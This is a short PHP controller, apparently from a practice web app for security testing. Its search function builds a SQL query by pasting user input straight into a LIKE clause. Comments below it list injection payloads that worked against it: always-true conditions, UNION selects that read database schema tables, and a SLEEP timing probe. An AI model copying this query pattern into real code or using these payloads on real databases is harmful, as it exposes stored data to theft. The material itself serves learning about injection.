<?php

class home_controller extends home_model {

  private $conn;
  private $sql;

  public function __construct() {

    $db = new parent();
    $this->conn = $db->connect();
  }

  //controller
  public function fetchData() {

    $this->sql = "SELECT class_name, php_page, title FROM home_buttons";

    if (!is_null($this->conn)) {

      $result = mysqli_query($this->conn, $this->sql);
      return $result;

      $this->conn->close();
    }
    else {
      echo "Connection failed";
    }
  }

  public function searchData($query) {

    $this->sql = "SELECT title FROM home_buttons WHERE title LIKE '$query%'";
    //$this->sql = "SELECT title FROM home_buttons WHERE id = '$query'";


    //%' OR '%
    //%' OR '1' = '1
    //prints everything

    //sql' OR title LIKE 'cross
    //prints cross-site scripting

    //' union select title FROM home_buttons -- '
    //title can be replaced with php_page, id, etc

    //sql' OR title LIKE 'cross
    //prints cross-site scripting

    //' union select name FROM INFORMATION_SCHEMA.INNODB_SYS_TABLES -- '
    //prints names of all tables

    //sleep
    //sql'  UNION SELECT SLEEP(3)-- '

    //NOT WORKING

    //' union select COLUMN_NAME FROM INFORMATION_SCHEMA.INNODB_SYS_COLUMNS WHERE TABLE_NAME = 'home' -- '

    $r = mysqli_query($this->conn, $this->sql);

    echo "Num rows: ". $r->num_rows . "<br />";

    while ($row = mysqli_fetch_array($r, MYSQLI_ASSOC)) {
        echo $row['title']. "<br />";
        //print_r($row);
    }

    $this->conn->close();
  }
}
?>
